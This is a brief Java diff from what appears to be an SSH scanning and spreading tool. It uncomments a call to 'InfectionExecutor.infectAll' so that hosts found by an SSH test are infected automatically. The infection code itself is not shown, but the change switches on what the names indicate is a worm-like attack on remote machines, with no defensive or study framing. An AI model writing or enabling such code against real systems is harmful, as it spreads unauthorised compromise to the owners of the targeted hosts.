@@ -17,7 +17,7 @@ public class Main {
 		Results results = SshTester.testIps(ipList);
 		displayResults(results);
 		
-//		InfectionExecutor.infectAll(results);
+		InfectionExecutor.infectAll(results);
 		System.out.println("ALL Done");
 	}
 	
